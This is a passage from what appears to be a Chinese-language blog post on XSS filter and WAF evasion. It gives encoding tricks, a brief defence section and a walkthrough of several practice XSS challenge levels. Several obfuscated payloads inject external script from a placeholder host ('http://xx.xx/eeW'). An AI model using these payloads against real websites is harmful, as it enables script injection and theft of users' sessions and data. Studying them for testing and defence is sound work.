class="keyword">return</span> str(int(s,<span class="number">36</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uu</span><span class="params">(s)</span>:</span></span><br><span class="line">    tmp = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        tmp += <span class="string">'\\u'</span> + hex(ord(i))[<span class="number">2</span>:].rjust(<span class="number">4</span>,<span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="comment">#s = (input("input the words you want exchange(only letters and numbers):\n"))</span></span><br><span class="line">s=<span class="string">'alert'</span></span><br><span class="line">print(<span class="string">"八进制："</span>+octlify(s))</span><br><span class="line">print(<span class="string">"十六进制："</span>+hexlify(s))</span><br><span class="line">print(<span class="string">"实体编码："</span>+html(s))</span><br><span class="line">print(<span class="string">"36为基数："</span>+tx(s)+<span class="string">"..toSting(36)"</span>)</span><br><span class="line">print(<span class="string">"\\u形式："</span>+uu(s))</span><br></pre></td></tr></table></figure><p>编码 alert，输出</p><p><img src="https://i.loli.net/2020/07/16/DiO97rynzSbjAsh.png" alt="image-20200716105441101"></p><p>拆分与编码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">\u0073etInterval(appendChild(createElement(</span>'<span class="attr">script</span>'))<span class="attr">.src</span>=<span class="string">'http://xx.xx/eeW'</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">\u0073etInterval(appendChild(createElement(</span>'<span class="attr">sc</span>\<span class="attr">162ipt</span>'))<span class="attr">.src</span>=<span class="string">'http://xx.xx/eeW'</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">\u0073etInterval(appendChild(createElement(</span>'<span class="attr">scr</span>'%<span class="attr">2b</span>'<span class="attr">ipt</span>'))<span class="attr">.src</span>=<span class="string">'http://xx.xx/eeW'</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">\u0073etInterval(\u0061ppendChild(\u0063reateElement(</span>'<span class="attr">scr</span>'%<span class="attr">2b</span>'<span class="attr">ipt</span>'))<span class="attr">.src</span>=<span class="string">'http://xx.xx/eeW'</span>)&gt;</span></span><br></pre></td></tr></table></figure><h5 id="parseInt-与toString"><a href="#parseInt-与toString" class="headerlink" title="parseInt()与toString()"></a>parseInt()与toString()</h5><p><img src="https://i.loli.net/2020/07/16/EhY5Mt3XBTJRLNf.png" alt="img"></p><p><img src="https://i.loli.net/2020/07/16/Tsb15exS7Pf8hqw.png" alt="img"></p><p>可以用parseInt将alert以基数为30转化为数字 8680439</p><p><img src="https://i.loli.net/2020/07/16/gsYhiLOabGMfDWv.png" alt="img"></p><p>用toString()函数将 8680439 以30为基数转成字符串alert</p><p><img src="https://i.loli.net/2020/07/16/bsQ5NxeCfGK8nDz.png" alt="img"></p><p>再结合on事件和Top属性 payload：<code>ontoggle=top[8680439..toString(30)](&#39;xss&#39;);</code></p><p>和Top属性类似的还有<code>self、parent、frames、content、window</code>，但top是最短的了。</p><p>【以30为基数的时候有一些字母不能表示，所以建议以36为基数】</p><h4 id="其它技巧"><a href="#其它技巧" class="headerlink" title="其它技巧"></a>其它技巧</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">alt</span>=<span class="string">al</span> <span class="attr">lang</span>=<span class="string">ert</span> <span class="attr">onerror</span>=<span class="string">top[alt%2blang](0)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个例子很巧妙，将alt和lang属性分别赋值合并起来就是alert，并在top属性内将2个属性相加。</p><p>除了拼alert，拼eval用处更大些，有了eval，后面的东西转码什么的也很方便</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[a</span>=<span class="string">'al'</span>,<span class="attr">b</span>=<span class="string">'ev'</span>,<span class="attr">b</span>%<span class="attr">2ba</span>](<span class="attr">atob</span>('<span class="attr">YWxlcnQoMSk</span>=<span class="string">'))&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;details open ontoggle=top[a='</span><span class="attr">al</span>',<span class="attr">b</span>=<span class="string">'ev'</span>,<span class="attr">b</span>%<span class="attr">2ba</span>]('\<span class="attr">141</span>\<span class="attr">154</span>\<span class="attr">145</span>\<span class="attr">162</span>\<span class="attr">164</span>\<span class="attr">50</span>\<span class="attr">61</span>\<span class="attr">51</span>')&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[a</span>=<span class="string">'al'</span>,<span class="attr">b</span>=<span class="string">'ev'</span>,<span class="attr">b</span>%<span class="attr">2ba</span>]('\<span class="attr">u0061</span>\<span class="attr">u006c</span>\<span class="attr">u0065</span>\<span class="attr">u0072</span>\<span class="attr">u0074</span>\<span class="attr">u0028</span>\<span class="attr">u0031</span>\<span class="attr">u0029</span>')&gt;</span></span><br></pre></td></tr></table></figure><p>setTimeout()函数也是没问题的，毕竟也能执行代码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[a</span>=<span class="string">'meout'</span>,<span class="attr">b</span>=<span class="string">'setTi'</span>,<span class="attr">b</span>%<span class="attr">2ba</span>]('\<span class="attr">141</span>\<span class="attr">154</span>\<span class="attr">145</span>\<span class="attr">162</span>\<span class="attr">164</span>\<span class="attr">50</span>\<span class="attr">61</span>\<span class="attr">51</span>')&gt;</span></span><br></pre></td></tr></table></figure><h5 id="setTimeout-amp-setInterval"><a href="#setTimeout-amp-setInterval" class="headerlink" title="setTimeout&amp;setInterval"></a>setTimeout&amp;setInterval</h5><p>setTimeout在延时一定时间后执行code一次</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">setTimeout</span>`<span class="attr">alert</span>\<span class="attr">u0028233</span>\<span class="attr">u0029</span>`&gt;</span></span><br></pre></td></tr></table></figure><p>setInterval以一定时间为周期执行code</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">setInterval(</span>'<span class="attr">al</span>'%<span class="attr">2b</span>'<span class="attr">ert</span>(<span class="attr">1</span>)')&gt;</span></span><br></pre></td></tr></table></figure><p>绕过waf，引用外部js</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">setInterval(appendChild(createElement(</span>'<span class="attr">script</span>'))<span class="attr">.src</span>=<span class="string">'http://xx.xx/eeW'</span>)&gt;</span></span><br></pre></td></tr></table></figure><h5 id="结合函数："><a href="#结合函数：" class="headerlink" title="结合函数："></a>结合函数：</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">s</span>=<span class="string">createElement(</span>'<span class="attr">script</span>');<span class="attr">body.appendChild</span>(<span class="attr">s</span>);<span class="attr">s.src</span>=<span class="string">[</span>'<span class="attr">http</span>','<span class="attr">:</span>//','<span class="attr">xx.xx</span>','/<span class="attr">eeW</span>']<span class="attr">.join</span>('') &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">s</span>=<span class="string">createElement(</span>'<span class="attr">script</span>');<span class="attr">body.appendChild</span>(<span class="attr">s</span>);<span class="attr">s.src</span>=<span class="string">[</span>'<span class="attr">http</span>']%<span class="attr">2B</span>['<span class="attr">:</span>//']%<span class="attr">2B</span>['<span class="attr">xx.xx</span>']%<span class="attr">2B</span>['/<span class="attr">eeW</span>']<span class="attr">.join</span>('') &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">s</span>=<span class="string">\u0063reateElement(</span>'<span class="attr">scr</span>'%<span class="attr">2b</span>'<span class="attr">ipt</span>');\<span class="attr">u0062ody.</span>\<span class="attr">u0061ppendChild</span>(<span class="attr">s</span>);<span class="attr">s.src</span>=<span class="string">'http://x'</span><span class="attr">.concat</span>('<span class="attr">x.xx</span>/','<span class="attr">eeW</span>'); &gt;</span></span><br></pre></td></tr></table></figure><h5 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h5><p><img src="https://i.loli.net/2020/07/16/b9NoRXeqlHyzJFk.png" alt="img"></p><p><img src="https://i.loli.net/2020/07/16/4uhGq7WyTeVNHOd.png" alt="image-20200716090526633"></p><p><img src="https://i.loli.net/2020/07/16/XLGUWbyp64kH7Ft.png" alt="image-20200716090613857"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">Set.constructor(</span>'<span class="attr">al</span>'%<span class="attr">2b</span>'<span class="attr">ert</span>(<span class="attr">1</span>)')()&gt;</span></span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">Set.constructor(appendChild(createElement(</span>'<span class="attr">script</span>'))<span class="attr">.src</span>=<span class="string">'http://xx.xx/eeW'</span>)()&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">Set.constructor</span>`<span class="attr">al</span>\<span class="attr">x65rt</span>\<span class="attr">x28</span>/<span class="attr">xss</span>/\<span class="attr">x29</span>```&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">Map.constructor</span>`<span class="attr">al</span>\<span class="attr">x65rt</span>\<span class="attr">x28</span>/<span class="attr">xss</span>/\<span class="attr">x29</span>```&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">clear.constructor</span>`<span class="attr">al</span>\<span class="attr">x65rt</span>\<span class="attr">x28</span>/<span class="attr">xss</span>/\<span class="attr">x29</span>```&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">Array.constructor</span>`<span class="attr">al</span>\<span class="attr">x65rt</span>\<span class="attr">x28</span>/<span class="attr">xss</span>/\<span class="attr">x29</span>```&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">WeakSet.constructor</span>`<span class="attr">al</span>\<span class="attr">x65rt</span>\<span class="attr">x28</span>/<span class="attr">xss</span>/\<span class="attr">x29</span>```&gt;</span></span><br><span class="line">    //后面两个``相当于()，是对函数的引用，是否可以用来绕过那些过滤括号的waf呢？</span><br></pre></td></tr></table></figure><h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><h5 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h5><p>​       严格控制用户可输入的范围，如手机号只能输入数字且长度不能大于11位等，如需输入某些敏感字符的情况下可对数据进行转义处理，对于用户数据的过滤尽可能地采用白名单而不是黑名单。</p><h5 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h5><p>​       减少不必要的输出，在需要输出的地方使用HTML编码将敏感字符转义为实体符，JavaScript进行DOM操作时注意不要将已转义的实体符再次解析成DOM对象。</p><h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><p>​       设置HttpOnly，开启WAF。</p><h3 id="一些BAT的XSS实例（修改而来的XSS题目）"><a href="#一些BAT的XSS实例（修改而来的XSS题目）" class="headerlink" title="一些BAT的XSS实例（修改而来的XSS题目）"></a>一些BAT的XSS实例（修改而来的XSS题目）</h3><h4 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h4><p><a href="http://px1624.sinaapp.com/test/xsstest1/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest1/</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> x=location.hash;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">aa</span><span class="params">(x)</span></span>&#123;&#125;;</span></span><br><span class="line"><span class="actionscript">setTimeout(<span class="string">"aa('"</span>+x+<span class="string">"')"</span>,<span class="number">100</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Give me xss bypass 1~</span><br></pre></td></tr></table></figure><p>这应该是一个DOM XSS，我们只需要对前面的括号进行闭合即可弹窗</p><p>payload:<code>http://px1624.sinaapp.com/test/xsstest1/#&#39;);alert(&#39;123</code></p><h4 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h4><p><a href="http://px1624.sinaapp.com/test/xsstest2/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest2/</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery-3.4.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Give me xss bypass 2~</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">'display:none'</span> <span class="attr">id</span>=<span class="string">'xx'</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'button'</span> <span class="attr">value</span>=<span class="string">'test'</span> <span class="attr">onclick</span>=<span class="string">'alert("哈哈，点这玩意没啥用的！")'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">   <span class="keyword">var</span> query = <span class="built_in">window</span>.location.search.substring(<span class="number">1</span>);</span></span><br><span class="line"><span class="actionscript">   <span class="keyword">var</span> vars = query.split(<span class="string">"&amp;"</span>);</span></span><br><span class="line"><span class="actionscript">   <span class="keyword">if</span>(vars)&#123;</span></span><br><span class="line">aa(vars[0],vars[1])</span><br><span class="line">   &#125;</span><br><span class="line"><span class="actionscript">   <span class="function"><span class="keyword">function</span> <span class="title">aa</span><span class="params">(x,y)</span></span>&#123;</span></span><br><span class="line"><span class="javascript">$(<span class="string">"#xx"</span>)[x]($(<span class="string">"#xx"</span>)[y]());</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里首先它获取了我们请求的参数，用&amp;分割获取变量，然后将这两个变量传到函数aa中执行，函数aa对id为xx的标签进行了两次dom操作</p><p>这里，<code>$(&quot;#xx&quot;)[&#39;text&#39;]()</code>的结果会是<code>&quot;&lt;img src=x onerror=alert(1)&gt;&quot;</code></p><p>所以这里的payload:<code>http://px1624.sinaapp.com/test/xsstest2/?append&amp;text</code></p><p>于是xx标签就会加上一个xx的text形式</p><p><img src="https://i.loli.net/2020/07/16/Mqo1veOpmRtzNa2.png" alt="image-20200714164426445"></p><p>从而触发弹窗。</p><h4 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h4><p><a href="http://px1624.sinaapp.com/test/xsstest3/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest3/</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Give me xss bypass 3~</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery-3.4.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> px = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">if</span> (px != <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">$(<span class="string">'xss'</span>).val(<span class="string">''</span>);</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里因为源码里的php代码没有显示，所以要猜变量名，这里猜出来用的变量名时px。然后我们传一个px=alert(1)，返回</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Give me xss bypass 3~</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery-3.4.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> px = <span class="string">'alert(1)'</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">if</span> (px != <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">$(<span class="string">'xss'</span>).val(<span class="string">'alert(1)'</span>);</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发现传入的是字符串，于是我们用引号闭合两边，再用运算符拼接一下即刻触发弹窗</p><p>payload:<code>http://px1624.sinaapp.com/test/xsstest3/?px=%27-alert(1)-%27</code></p><p>返回：</p><p><img src="https://i.loli.net/2020/07/16/qIwr4jZ2Pa5btHR.png" alt="image-20200716174703421"></p><h4 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h4><p><a href="http://px1624.sinaapp.com/test/xsstest3/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest3/</a></p><p>第四关在第三关的基础上过滤了运算符，但在js中，in，instanceof也属于运算符，所以可以用这两个进行绕过</p><p>但这一题的预期解是用的模板字符串。</p><p>payload:<a href="http://px1624.sinaapp.com/test/xsstest4/?px=%27;`;{alert" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest4/?px=%27;`;{alert</a>(%271</p><p>返回</p><p><img src="https://i.loli.net/2020/07/16/x8g6yJNVKd7Bujc.png" alt="image-20200716174741196"></p><p>两次同步输入导致中间的代码都变成了模板字符串。</p><h4 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h4><p><a href="http://px1624.sinaapp.com/test/xsstest5/user.php?callback=Give%20me%20xss%20bypass" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest5/user.php?callback=Give%20me%20xss%20bypass</a>~</p><p>这一关进去就重定向到了user.php，发现url上有一个callback参数，</p><p>源码只有</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pre</span> <span class="attr">style</span>=<span class="string">"word-wrap: break-word; white-space: pre-wrap;"</span>&gt;</span>Give me xss bypass~<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>所以输入点就是callback了，输出点在<code>&lt;pre&gt;</code>标签间，<code>&lt;pre&gt;</code>标签中的其他标签都会被实体编码，所以这里无法闭合标签。</p><p>然后因为是重定向过来的，所以把重定向给拦了可以看到</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../jquery-3.4.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Script</span> <span class="attr">src</span>=<span class="string">"./index.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> orguin = $.Tjs_Get(<span class="string">'uin'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> pagenum= $.Tjs_Get(<span class="string">'pn'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span>(orguin&lt;=<span class="number">0</span>) <span class="built_in">window</span>.location=<span class="string">"./user.php?callback=Give me xss bypass~"</span>;</span></span><br><span class="line"><span class="handlebars"><span class="xml">document.write('<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://px1624.sinaapp.com/'+orguin+'?'+pagenum+'"</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span>');</span></span></span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Give me xss bypass 5~</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中Tjs_Get函数在index.js中，主要是获取url参数用的。</p><p>所以payload：<code>http://px1624.sinaapp.com/test/xsstest5/?uin=test/xsstest5/user.php&amp;pn=callback=alert(1)</code></p><p>返回</p><p><img src="https://i.loli.net/2020/07/16/hKC5lJEaPs67kpr.png" alt="image-20200716174808888"></p><p>因为<a href="http://px1624.sinaapp.com/test/xsstest5/user.php?callback=alert(1)这个文件内容只有alert(1)，被JS引擎解释执行后于是产生弹窗。" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest5/user.php?callback=alert(1)这个文件内容只有alert(1)，被JS引擎解释执行后于是产生弹窗。</a></p><h4 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h4><p><a href="http://px1624.sinaapp.com/test/xsstest6" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest6</a></p><p>相比第五关，可控的参数只有一个了，少了问号，并且过滤了问号和百分号，这就阻止了url编码</p><p>这里是用的js里替换了%</p><p><img src="https://i.loli.net/2020/07/17/JlqyIudcxtnBbeV.png" alt="image-20200717132954073"></p><p>但这里匹配？用的是正则，和.*一起，而在<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions" target="_blank" rel="noopener">js的正则</a>里 点 匹配除了换行符以外的任意字符，并且匹配到换行符以后就会返回了，不会继续匹配下去。所以换行符应该就是突破点了，可是在url里换行符得用编码%0a表示，可%又被过滤了，<del>套娃?!</del>。这里出题人指出，表示换行符并不只%0a,<a href="http://tools.jb51.net/table/javascript_escape" target="_blank" rel="noopener">这里</a>指出换行符还可以用\u000A，\u000D，\u2028和 \u2029表示</p><p>于是测试payload:<code>location=&quot;http://px1624.sinaapp.com/test/xsstest6/?#11?\u2028&amp;uin=../test/xsstest6/user.php?callback=alert()&quot;</code>，这里不能直接在url上输入，不然\u2028会被认为是字符串，所以只能在控制台打。然而我依旧没有成功（作者原话：得用老版Chrome或者IE，新版的Chorme对location.hash的特殊字符也进行了URL编码，所以导致\u2028和\u2029这种换行符的解析失效，从而不能用。)</p><p>最后这里第六关的user.php还对参数的值的长度做了要求，刚好无法弹1；</p><p>这里绕过的方法一个是用第五关的user.php，另一个方法，作者是用的name传参，利用iframe去这样构造</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span> = <span class="string">"px"</span> <span class="attr">name</span> = <span class="string">"&lt;img src=x onerror=alert(1)&gt;"</span> <span class="attr">src</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElemntById(<span class="string">"px"</span>).src=<span class="string">"http://px1624.sinaapp.com/test/xsstest6/#?\u2028uin=../test/xsstest6/user.php?callback=$&#123;name&#125;"</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h4><p><a href="http://px1624.sinaapp.com/test/xsstest7" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest7</a></p><p>输入点是px，输出点位于<code>&lt;script&gt;</code>标签间，但是会对特殊符号进行转义。经测试并没有对反斜杠进行转义，所以可以用反斜杠把它的反斜杠给过滤掉，从而逃逸出单引号，</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?px=\'-alert(1)-</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> px=<span class="string">'\\'</span>-alert(<span class="number">1</span>)-<span class="string">';</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是后面那个单引号则没有办法，</p><p>因为这里也有同步输出，所以想用第四题那种模板字符串，但是这里一个输出在js中，一个在html中，所以失败</p><p><img src="https://i.loli.net/2020/07/16/PtJAEofjhLVgknK.png" 